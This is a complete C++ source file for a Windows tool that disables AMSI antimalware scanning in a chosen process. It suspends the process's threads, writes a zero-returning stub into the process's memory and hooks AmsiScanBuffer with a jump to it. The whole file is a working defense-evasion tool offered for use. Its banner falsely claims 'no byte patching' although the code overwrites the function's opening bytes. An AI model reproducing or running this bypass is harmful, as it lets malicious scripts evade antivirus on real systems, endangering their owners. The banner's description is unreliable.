#include <Windows.h>
#include <winternl.h>
#include <iostream>
#include <string>
#include <vector>
#include <TlHelp32.h>
#include <Psapi.h>
#include <sstream>
#include <iomanip>

#pragma comment(lib, "ntdll.lib")

typedef struct _MY_CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} MY_CLIENT_ID, * PMY_CLIENT_ID;

extern "C" NTSTATUS NTAPI NtQueryInformationProcess(
    _In_ HANDLE ProcessHandle,
    _In_ PROCESSINFOCLASS ProcessInformationClass,
    _Out_ PVOID ProcessInformation,
    _In_ ULONG ProcessInformationLength,
    _Out_opt_ PULONG ReturnLength
);

extern "C" NTSTATUS NTAPI NtAllocateVirtualMemory(
    _In_ HANDLE ProcessHandle,
    _Inout_ PVOID* BaseAddress,
    _In_ ULONG_PTR ZeroBits,
    _Inout_ PSIZE_T RegionSize,
    _In_ ULONG AllocationType,
    _In_ ULONG Protect
);

extern "C" NTSTATUS NTAPI NtProtectVirtualMemory(
    _In_ HANDLE ProcessHandle,
    _Inout_ PVOID* BaseAddress,
    _Inout_ PSIZE_T RegionSize,
    _In_ ULONG NewProtect,
    _Out_ PULONG OldProtect
);

extern "C" NTSTATUS NTAPI NtWriteVirtualMemory(
    _In_ HANDLE ProcessHandle,
    _In_opt_ PVOID BaseAddress,
    _In_ PVOID Buffer,
    _In_ SIZE_T NumberOfBytesToWrite,
    _Out_opt_ PSIZE_T NumberOfBytesWritten
);

extern "C" NTSTATUS NTAPI NtResumeThread(
    _In_ HANDLE ThreadHandle,
    _Out_opt_ PULONG PreviousSuspendCount
);

extern "C" NTSTATUS NTAPI NtSuspendThread(
    _In_ HANDLE ThreadHandle,
    _Out_opt_ PULONG PreviousSuspendCount
);

extern "C" NTSTATUS NTAPI NtOpenThread(
    _Out_ PHANDLE ThreadHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ PMY_CLIENT_ID ClientId
);

typedef struct _RTL_PROCESS_MODULE_INFORMATION {
    HANDLE Section;
    PVOID MappedBase;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    CHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, * PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES {
    ULONG NumberOfModules;
    RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, * PRTL_PROCESS_MODULES;

#define SystemModuleInformation 11

enum LogLevelType {
    DEBUG_LEVEL,
    INFO_LEVEL,
    WARNING_LEVEL,
    ERROR_LEVEL
};

class Logger {
private:
    LogLevelType m_level;
    bool m_debugEnabled;

public:
    Logger(LogLevelType level = INFO_LEVEL, bool debugEnabled = false) : m_level(level), m_debugEnabled(debugEnabled) {}

    void setDebugEnabled(bool enabled) {
        m_debugEnabled = enabled;
    }

    void setLevel(LogLevelType level) {
        m_level = level;
    }

    void debug(const std::string& message) {
        if (m_debugEnabled) {
            std::cout << "[DEBUG] " << message << std::endl;
        }
    }

    void info(const std::string& message) {
        if (m_level <= INFO_LEVEL) {
            std::cout << "[+] " << message << std::endl;
        }
    }

    void warning(const std::string& message) {
        if (m_level <= WARNING_LEVEL) {
            std::cout << "[!] " << message << std::endl;
        }
    }

    void error(const std::string& message) {
        if (m_level <= ERROR_LEVEL) {
            std::cerr << "[-] " << message << std::endl;
        }
    }

    std::string formatHex(PVOID ptr) {
        std::stringstream ss;
        ss << "0x" << std::hex << std::setw(16) << std::setfill('0') << (ULONG_PTR)ptr;
        return ss.str();
    }

    std::string formatHex(DWORD value) {
        std::stringstream ss;
        ss << "0x" << std::hex << std::setw(8) << std::setfill('0') << value;
        return ss.str();
    }

    std::string formatStatus(NTSTATUS status) {
        std::stringstream ss;
        ss << "0x" << std::hex << std::setw(8) << std::setfill('0') << status;
        return ss.str();
    }
};

class AmsiBypass {
private:
    DWORD m_processId;
    HANDLE m_processHandle;
    std::vector<HANDLE> m_threadHandles;
    Logger m_logger;
    bool m_verbose;

    BOOL GetProcessThreads(DWORD processId, std::vector<DWORD>& threadIds) {
        HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if (hThreadSnap == INVALID_HANDLE_VALUE) {
            m_logger.error("Failed to create thread snapshot. Error: " + std::to_string(GetLastError()));
            return FALSE;
        }

        THREADENTRY32 te32;
        te32.dwSize = sizeof(THREADENTRY32);

        if (!Thread32First(hThreadSnap, &te32)) {
            m_logger.error("Failed to get first thread. Error: " + std::to_string(GetLastError()));
            CloseHandle(hThreadSnap);
            return FALSE;
        }

        do {
            if (te32.th32OwnerProcessID == processId) {
                threadIds.push_back(te32.th32ThreadID);
                m_logger.debug("Found thread ID: " + std::to_string(te32.th32ThreadID));
            }
        } while (Thread32Next(hThreadSnap, &te32));

        CloseHandle(hThreadSnap);
        return TRUE;
    }

    BOOL SuspendAllThreads() {
        std::vector<DWORD> threadIds;
        if (!GetProcessThreads(m_processId, threadIds)) {
            m_logger.error("Failed to enumerate process threads");
            return FALSE;
        }

        for (DWORD threadId : threadIds) {
            if (threadId == GetCurrentThreadId()) continue;

            HANDLE hThread = NULL;
            OBJECT_ATTRIBUTES oa = { sizeof(OBJECT_ATTRIBUTES) };
            MY_CLIENT_ID cid = { 0 };
            cid.UniqueProcess = (HANDLE)(ULONG_PTR)m_processId;
            cid.UniqueThread = (HANDLE)(ULONG_PTR)threadId;

            NTSTATUS status = NtOpenThread(
                &hThread,
                THREAD_SUSPEND_RESUME,
                &oa,
                &cid
            );

            if (NT_SUCCESS(status)) {
                ULONG previousCount = 0;
                status = NtSuspendThread(hThread, &previousCount);
                if (NT_SUCCESS(status)) {
                    m_threadHandles.push_back(hThread);
                    m_logger.debug("Suspended thread ID: " + std::to_string(threadId) + " (previous suspend count: " + std::to_string(previousCount) + ")");
                }
                else {
                    m_logger.debug("Failed to suspend thread ID: " + std::to_string(threadId) + " Status: " + m_logger.formatStatus(status));
                    CloseHandle(hThread);
                }
            }
            else {
                m_logger.debug("Failed to open thread ID: " + std::to_string(threadId) + " Status: " + m_logger.formatStatus(status));
            }
        }

        m_logger.info("Suspended " + std::to_string(m_threadHandles.size()) + " threads");
        return m_threadHandles.size() > 0;
    }

    BOOL ResumeAllThreads() {
        BOOL result = TRUE;
        for (HANDLE hThread : m_threadHandles) {
            ULONG previousCount = 0;
            NTSTATUS status = NtResumeThread(hThread, &previousCount);
            if (!NT_SUCCESS(status)) {
                result = FALSE;
                m_logger.warning("Failed to resume thread. Status: " + m_logger.formatStatus(status));
            }
            else {
                m_logger.debug("Thread resumed (previous suspend count: " + std::to_string(previousCount) + ")");
            }
            CloseHandle(hThread);
        }
        m_threadHandles.clear();
        return result;
    }

    PVOID FindAmsiScanBufferAddress() {
        HMODULE hMods[1024];
        DWORD cbNeeded;
        if (!EnumProcessModules(m_processHandle, hMods, sizeof(hMods), &cbNeeded)) {
            m_logger.error("Failed to enumerate process modules. Error: " + std::to_string(GetLastError()));
            return NULL;
        }

        HMODULE amsiModule = NULL;
        for (unsigned int i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
            CHAR szModName[MAX_PATH];
            if (GetModuleFileNameExA(m_processHandle, hMods[i], szModName, sizeof(szModName))) {
                if (strstr(szModName, "amsi.dll") != NULL) {
                    amsiModule = hMods[i];
                    m_logger.debug("Found amsi.dll at: " + m_logger.formatHex(amsiModule));
                    break;
                }
            }
        }

        if (!amsiModule) {
            HMODULE hAmsi = LoadLibraryA("amsi.dll");
            if (!hAmsi) {
                m_logger.error("Failed to load amsi.dll locally. Error: " + std::to_string(GetLastError()));
                return NULL;
            }

            PVOID localAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
            if (!localAmsiScanBuffer) {
                m_logger.error("Failed to get AmsiScanBuffer address. Error: " + std::to_string(GetLastError()));
                FreeLibrary(hAmsi);
                return NULL;
            }

            PVOID localAmsiBase = (PVOID)hAmsi;
            SIZE_T offset = (SIZE_T)localAmsiScanBuffer - (SIZE_T)localAmsiBase;
            m_logger.debug("AmsiScanBuffer offset: " + m_logger.formatHex((PVOID)offset));

            MODULEINFO mi;
            EnumProcessModules(m_processHandle, &amsiModule, sizeof(amsiModule), &cbNeeded);
            if (!GetModuleInformation(m_processHandle, amsiModule, &mi, sizeof(mi))) {
                m_logger.error("Failed to get remote amsi.dll module info. Error: " + std::to_string(GetLastError()));
                FreeLibrary(hAmsi);
                return NULL;
            }

            m_logger.debug("Remote amsi.dll base: " + m_logger.formatHex(mi.lpBaseOfDll));
            PVOID remoteAmsiScanBuffer = (PVOID)((SIZE_T)mi.lpBaseOfDll + offset);
            m_logger.debug("Remote AmsiScanBuffer address: " + m_logger.formatHex(remoteAmsiScanBuffer));

            FreeLibrary(hAmsi);
            return remoteAmsiScanBuffer;
        }
        else {
            MODULEINFO mi;
            if (!GetModuleInformation(m_processHandle, amsiModule, &mi, sizeof(mi))) {
                m_logger.error("Failed to get remote amsi.dll module info. Error: " + std::to_string(GetLastError()));
                return NULL;
            }

            HMODULE hAmsi = LoadLibraryA("amsi.dll");
            if (!hAmsi) {
                m_logger.error("Failed to load amsi.dll locally. Error: " + std::to_string(GetLastError()));
                return NULL;
            }

            PVOID localAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
            if (!localAmsiScanBuffer) {
                m_logger.error("Failed to get AmsiScanBuffer address. Error: " + std::to_string(GetLastError()));
                FreeLibrary(hAmsi);
                return NULL;
            }

            PVOID localAmsiBase = (PVOID)hAmsi;
            SIZE_T offset = (SIZE_T)localAmsiScanBuffer - (SIZE_T)localAmsiBase;
            m_logger.debug("AmsiScanBuffer offset: " + m_logger.formatHex((PVOID)offset));
            m_logger.debug("Remote amsi.dll base: " + m_logger.formatHex(mi.lpBaseOfDll));

            PVOID remoteAmsiScanBuffer = (PVOID)((SIZE_T)mi.lpBaseOfDll + offset);
            m_logger.debug("Remote AmsiScanBuffer address: " + m_logger.formatHex(remoteAmsiScanBuffer));

            FreeLibrary(hAmsi);
            return remoteAmsiScanBuffer;
        }
    }

public:
    AmsiBypass(DWORD processId, bool verbose = false) :
        m_processId(processId),
        m_processHandle(NULL),
        m_verbose(verbose) {
        m_logger.setDebugEnabled(verbose);
        if (verbose) {
            std::cout << "[DEBUG] Creating AmsiBypass instance for PID: " << processId << std::endl;
        }
    }

    ~AmsiBypass() {
        if (m_processHandle) {
            CloseHandle(m_processHandle);
        }
        ResumeAllThreads();
    }

    BOOL Execute() {
        m_logger.info("Targeting process with PID: " + std::to_string(m_processId));

        m_processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, m_processId);
        if (!m_processHandle) {
            m_logger.error("Failed to open process. Error: " + std::to_string(GetLastError()));
            return FALSE;
        }
        m_logger.debug("Process handle: " + m_logger.formatHex(m_processHandle));

        if (!SuspendAllThreads()) {
            m_logger.error("Failed to suspend threads");
            CloseHandle(m_processHandle);
            return FALSE;
        }

        PVOID amsiScanBufferAddr = FindAmsiScanBufferAddress();
        if (!amsiScanBufferAddr) {
            m_logger.error("Failed to locate AMSI functions");
            ResumeAllThreads();
            CloseHandle(m_processHandle);
            return FALSE;
        }

        unsigned char amsiBypass[] = {
            0x48, 0x89, 0x5C, 0x24, 0x08,
            0x48, 0x89, 0x74, 0x24, 0x10,
            0x57,
            0x48, 0x83, 0xEC, 0x20,
            0x33, 0xC0,
            0x48, 0x83, 0xC4, 0x20,
            0x5F,
            0x48, 0x8B, 0x74, 0x24, 0x10,
            0x48, 0x8B, 0x5C, 0x24, 0x08,
            0xC3
        };

        PVOID remoteMemory = NULL;
        SIZE_T regionSize = sizeof(amsiBypass);
        NTSTATUS status = NtAllocateVirtualMemory(
            m_processHandle,
            &remoteMemory,
            0,
            &regionSize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        );

        if (!NT_SUCCESS(status)) {
            m_logger.error("Failed to allocate memory in target process. Status: " + m_logger.formatStatus(status));
            ResumeAllThreads();
            CloseHandle(m_processHandle);
            return FALSE;
        }
        m_logger.debug("Allocated memory at: " + m_logger.formatHex(remoteMemory));

        SIZE_T bytesWritten = 0;
        status = NtWriteVirtualMemory(
            m_processHandle,
            remoteMemory,
            amsiBypass,
            sizeof(amsiBypass),
            &bytesWritten
        );

        if (!NT_SUCCESS(status) || bytesWritten != sizeof(amsiBypass)) {
            m_logger.error("Failed to write memory in target process. Status: " + m_logger.formatStatus(status));
            ResumeAllThreads();
            CloseHandle(m_processHandle);
            return FALSE;
        }
        m_logger.debug("Wrote " + std::to_string(bytesWritten) + " bytes of proxy function");

        ULONG oldProtect = 0;
        status = NtProtectVirtualMemory(
            m_processHandle,
            &remoteMemory,
            &regionSize,
            PAGE_EXECUTE_READ,
            &oldProtect
        );

        if (!NT_SUCCESS(status)) {
            m_logger.error("Failed to change memory protection. Status: " + m_logger.formatStatus(status));
            ResumeAllThreads();
            CloseHandle(m_processHandle);
            return FALSE;
        }
        m_logger.debug("Changed memory protection to PAGE_EXECUTE_READ");

        unsigned char jumpBytes[14] = { 0 };
        jumpBytes[0] = 0x48;
        jumpBytes[1] = 0xB8;
        *(PVOID*)(&jumpBytes[2]) = remoteMemory;
        jumpBytes[10] = 0xFF;
        jumpBytes[11] = 0xE0;
        jumpBytes[12] = 0xCC;
        jumpBytes[13] = 0xCC;

        PVOID targetAddr = amsiScanBufferAddr;
        regionSize = sizeof(jumpBytes);
        status = NtProtectVirtualMemory(
            m_processHandle,
            &targetAddr,
            &regionSize,
            PAGE_READWRITE,
            &oldProtect
        );

        if (!NT_SUCCESS(status)) {
            m_logger.error("Failed to make AMSI function writable. Status: " + m_logger.formatStatus(status));
            ResumeAllThreads();
            CloseHandle(m_processHandle);
            return FALSE;
        }
        m_logger.debug("Made AmsiScanBuffer writable");

        status = NtWriteVirtualMemory(
            m_processHandle,
            amsiScanBufferAddr,
            jumpBytes,
            sizeof(jumpBytes),
            &bytesWritten
        );

        if (!NT_SUCCESS(status) || bytesWritten != sizeof(jumpBytes)) {
            m_logger.error("Failed to write jump instruction. Status: " + m_logger.formatStatus(status));
            ResumeAllThreads();
            CloseHandle(m_processHandle);
            return FALSE;
        }
        m_logger.debug("Wrote jump instruction to AmsiScanBuffer");

        status = NtProtectVirtualMemory(
            m_processHandle,
            &targetAddr,
            &regionSize,
            oldProtect,
            &oldProtect
        );

        if (!NT_SUCCESS(status)) {
            m_logger.error("Failed to restore protection. Status: " + m_logger.formatStatus(status));
            ResumeAllThreads();
            CloseHandle(m_processHandle);
            return FALSE;
        }
        m_logger.debug("Restored original memory protection");

        if (!ResumeAllThreads()) {
            m_logger.error("Failed to resume threads");
            CloseHandle(m_processHandle);
            return FALSE;
        }

        m_logger.info("AMSI bypass successfully applied");
        return TRUE;
    }
};

void PrintBanner() {
    std::cout << "\n==================================================" << std::endl;
    std::cout << "      Innovative AMSI Redirection Bypass Tool      " << std::endl;
    std::cout << "==================================================" << std::endl;
    std::cout << "[*] Uses NtAPI calls to dynamically redirect AMSI" << std::endl;
    std::cout << "[*] No pattern scanning, no byte patching" << std::endl;
    std::cout << "==================================================" << std::endl;
}

int main(int argc, char* argv[]) {
    PrintBanner();

    bool verbose = false;
    DWORD pid = 0;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-v") == 0 || strcmp(argv[i], "--verbose") == 0) {
            verbose = true;
            std::cout << "[*] Verbose mode enabled" << std::endl;
        }
        else if (isdigit(argv[i][0])) {
            pid = atoi(argv[i]);
        }
        else if (strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0) {
            std::cout << "\nUsage: " << argv[0] << " <PID> [-v|--verbose]" << std::endl;
            std::cout << "\nOptions:" << std::endl;
            std::cout << "  <PID>            Process ID to target" << std::endl;
            std::cout << "  -v, --verbose    Enable verbose debugging output" << std::endl;
            std::cout << "  -h, --help       Display this help message" << std::endl;
            std::cout << "\nExample: " << argv[0] << " 1234 -v" << std::endl;
            return 0;
        }
    }

    if (pid <= 0) {
        std::cerr << "[-] Invalid or missing PID" << std::endl;
        std::cout << "\nUsage: " << argv[0] << " <PID> [-v|--verbose]" << std::endl;
        std::cout << "\nExample: " << argv[0] << " 1234" << std::endl;
        return 1;
    }

    AmsiBypass bypass(pid, verbose);
    if (bypass.Execute()) {
        std::cout << "[+] Successfully bypassed AMSI in process " << pid << std::endl;
        return 0;
    }
    else {
        std::cerr << "[-] Failed to bypass AMSI in process " << pid << std::endl;
        return 1;
    }
}
